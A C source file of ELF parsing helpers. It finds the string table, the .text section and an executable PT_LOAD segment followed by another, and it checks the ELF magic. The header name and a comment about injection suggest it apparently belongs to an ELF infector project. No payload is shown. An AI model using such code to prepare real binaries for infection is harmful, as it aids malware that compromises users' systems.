#include "famine.h"

void		*get_str_table(t_elf *elf)
{
	uint16_t		i;
	Elf64_Shdr		*str_table;

	str_table = NULL;
	for (i = 0; i < elf->header->e_shnum; i++)
	{
		if (elf->sections[i].sh_offset > (unsigned int)elf->size)
			return (NULL);
		if (elf->sections[i].sh_type == SHT_STRTAB)
			str_table = &elf->sections[i];
	}
	return (str_table);
}

void		*get_text_section(t_elf *elf)
{
	uint16_t		i;
	Elf64_Shdr		*str_table;
	char			*str;

	str_table = get_str_table(elf);
	if (!str_table)
		return (NULL);
	str = elf->addr + str_table->sh_offset;
	i = 0;
	while (i < elf->header->e_shnum && strcmp(str + elf->sections[i].sh_name, ".text"))
		i++;
	if (i == elf->header->e_shnum)
		return (NULL);
	return (&elf->sections[i]);
}

void		*get_pt_load_exec(t_elf *elf)
{
	uint16_t		i;
	Elf64_Phdr		*pt_load;
	Elf64_Phdr		*next;

	//TODO: fix for thin files like inject
	pt_load = elf->segments;
	next = (elf->header->e_phnum > 1) ? pt_load + 1 : NULL;
	for (i = 0; i < elf->header->e_phnum; i++)
	{
		if (pt_load->p_type == PT_LOAD && next && next->p_type == PT_LOAD && pt_load->p_flags & PF_X)
			break;
		pt_load = (i < elf->header->e_phnum) ? pt_load + 1 : NULL;
		next = (i < elf->header->e_phnum - 1) ? pt_load + 1 : NULL;
	}
	if (pt_load->p_type != PT_LOAD || !next || next->p_type != PT_LOAD)
		return (NULL);
	return (pt_load);
}

int			init_elf(t_elf *elf, void *addr, long size)
{
	elf->addr = addr;
	elf->size = size;
	elf->header = elf->addr;
	if ((long)elf->header->e_phoff > elf->size || (long)elf->header->e_shoff > elf->size)
		return (CORRUPTED_FILE);
	elf->segments = elf->addr + elf->header->e_phoff;
	elf->sections = elf->addr + elf->header->e_shoff;
	elf->text_section = get_text_section(elf);
	if (!elf->text_section)
		return (CORRUPTED_FILE);
	elf->pt_load = get_pt_load_exec(elf);
	if (!elf->pt_load)
		return (CORRUPTED_FILE);
	#ifdef DEBUG
		debug_print_elf(elf);
	#endif
	return (0);
}

int			check_magic_elf(void *addr)
{
	Elf64_Ehdr		*header;
	unsigned char	magic[EI_NIDENT];

	header = addr;
	memcpy(magic, addr, sizeof(magic));
	if ((magic[EI_MAG0] == ELFMAG0) &&
		(magic[EI_MAG1] == ELFMAG1) &&
		(magic[EI_MAG2] == ELFMAG2) &&
		(magic[EI_MAG3] == ELFMAG3))
	{
		if (magic[EI_CLASS] == ELFCLASS64)
			return (header->e_type);
	}
	return (ET_NONE);
}
